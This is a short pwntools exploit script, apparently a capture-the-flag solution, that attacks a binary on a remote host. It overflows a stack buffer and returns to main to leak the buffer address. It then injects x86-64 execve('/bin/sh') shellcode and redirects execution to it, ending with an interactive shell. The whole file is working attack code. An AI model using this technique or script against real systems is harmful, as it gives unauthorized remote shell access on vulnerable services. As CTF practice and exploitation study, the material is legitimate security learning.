from pwn import *

p = remote("34.125.202.58", 10000)
# p = process("./prob")
e = ELF("./prob")

def slog(symbol, addr): return success(symbol + ": " + hex(addr))
context.log_level = 'debug'

# gdb.attach(p)

main = 0x00000000004011ff
slog("main", main)
# shellcode = shellcraft.i386.linux.sh()
# print(run_assembly(shellcode))

code = b"A"*(208+8)
code += p64(0x000000000040101a)
code += p64(main)

p.sendline(code)
p.recvuntil("add: ")
tmp = p.recvuntil("\n")
slog("buf", int(tmp,16))

code = b"\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"
code += b"\x00"*(208+8-len(code))

code += p64(int(tmp,16)+0x10)

p.sendline(code)

# code = b"B"*(208+8)
# p.sendline(b"AAAA")
p.interactive()